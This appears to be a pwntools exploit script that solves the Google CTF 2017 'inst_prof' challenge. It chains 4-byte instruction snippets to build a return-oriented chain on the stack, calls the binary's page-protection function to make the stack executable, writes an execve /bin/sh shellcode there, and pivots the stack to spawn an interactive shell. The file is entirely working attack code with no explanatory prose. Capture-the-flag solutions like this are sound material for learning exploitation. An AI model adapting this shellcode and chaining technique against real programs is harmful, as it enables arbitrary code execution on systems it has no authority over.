#
# Google CTF 2017 pwn inst_prof
#
# Based on
# * https://develbranch.com

from pwn import *
import sys

b = ELF('./inst_prof')

context.arch = b.arch
context.log_level = 'info'

r = process('./inst_prof')

def assemble(code):
    encoding = asm(code)
    if len(encoding) > 4:
        raise Exception("TOO LONG! code=%s, len=%d" % (code, len(encoding)))
    while len(encoding) < 4:
        encoding += '\xc3'
    return encoding

def movb_r15(n):
    if n <= 0x7f:
        return assemble('push %d; pop r15' % n)
    else:
        return assemble('xor r15, r15') + assemble('inc r15') * n

#
# stack based programming
#
def store_r15(stack_off):
    return assemble('push rsp; pop r14') + assemble('inc r14') * stack_off + assemble('mov [r14], r15')

def load_to_r15(stack_off):
    return assemble('push rsp; pop r14') + assemble('inc r14') * stack_off + assemble('mov r15, [r14]')

def mov_r15_retaddr():
    return assemble('mov r15,[rsp]')

def write_string(stack_off, s):
    encoding = ''
    for c in s:
        encoding += movb_r15(ord(c))
        encoding += store_r15(stack_off)
        stack_off += 1
    return encoding

# Execute /bin/sh - 27 bytes : http://shell-storm.org/shellcode/files/shellcode-806.php
shellcode = "\x48\x81\xC4\x00\x10\x00\x00" # add rsp,0x1000 -> push rsp into 'rw-' region
shellcode += "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" 

if __name__ == "__main__":

    r.recvuntil('ready')

    offset = 56
    
    op = ''
    op += mov_r15_retaddr()
    op += assemble('inc r15') * (0xbc3 - 0xb18)     # 0xbc3: pop rdi;ret
    op += store_r15(offset) 
    op += assemble('mov r14, rcx') # rcx is 0x1000
    op += assemble('push rsp; pop r15')
    op += assemble('dec r14') # r14 ix 0xfff
    op += assemble('not r14') # r14 is 1111...1000
    op += assemble('and r15, r14') # rsp & 1111...1000
    op += store_r15(offset + 0x8)
    
    op += mov_r15_retaddr()
    op += assemble('dec r15') * (0xb18 - 0xa20)     # make_page_executable() -> r-x
    op += store_r15(offset + 0x10)
    
    op += assemble('push rsp; pop r15')
    op += assemble('inc r15') * (offset + 0x70)
    op += store_r15(offset + 0x18)

    op += write_string(offset + 0x70, shellcode)

    op += movb_r15(offset)                        # stack pivot
    op += assemble('add rsp, r15')
    
    r.send(op)
    r.interactive()
